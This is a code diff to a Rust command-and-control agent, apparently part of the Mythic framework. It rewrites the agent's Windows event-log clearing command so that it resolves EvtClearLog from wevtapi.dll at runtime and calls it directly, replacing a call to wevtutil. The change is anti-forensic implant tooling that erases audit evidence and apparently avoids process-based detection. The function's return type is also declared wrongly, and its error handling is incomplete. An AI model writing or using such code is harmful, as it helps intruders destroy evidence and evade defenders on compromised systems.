@@ -204,19 +204,46 @@ pub fn eventlog_clear(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std
 
 #[cfg(target_os = "windows")]
 fn eventlog_clear_impl(task: &AgentTask, log: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
+    use std::ptr;
+
     if log.is_empty() {
         return Ok(mythic_error!(task.id, "Event log name required"));
     }
 
-    let output = Command::new("wevtutil")
-        .args(&["cl", log])
-        .output()?;
+    unsafe {
+        // Resolve EvtClearLog from wevtapi.dll
+        type EvtClearLogFn = unsafe extern "system" fn(
+            *mut std::ffi::c_void,
+            *const u16,
+            *const u16,
+            u32,
+        ) -> *mut std::ffi::c_void;
 
-    if output.status.success() {
-        Ok(mythic_success!(task.id, format!("Cleared event log: {}", log)))
-    } else {
-        let stderr = String::from_utf8_lossy(&output.stderr);
-        Ok(mythic_error!(task.id, format!("Failed to clear event log: {}", stderr)))
+        let evt_clear_log = match crate::winapi_resolve::resolve("wevtapi.dll", "EvtClearLog") {
+            Some(ptr) => std::mem::transmute::<_, EvtClearLogFn>(ptr),
+            None => {
+                return Ok(mythic_error!(task.id, "Failed to resolve EvtClearLog"));
+            }
+        };
+
+        // Convert log name to wide string
+        let log_wide: Vec<u16> = log.encode_utf16().chain(std::iter::once(0)).collect();
+
+        // EvtClearLog(Session, ChannelPath, TargetFilePath, Flags)
+        // Session = NULL, TargetFilePath = NULL, Flags = 0
+        let result = evt_clear_log(
+            ptr::null_mut(),
+            log_wide.as_ptr(),
+            ptr::null(),
+            0,
+        );
+
+        if result.is_null() {
+            // Get last error for more details
+            Ok(mythic_error!(task.id, format!("Failed to clear event log: {}", log)))
+        } else {
+            Ok(mythic_success!(task.id, format!("Cleared event log: {}", log)))
+        }
     }
 }
 
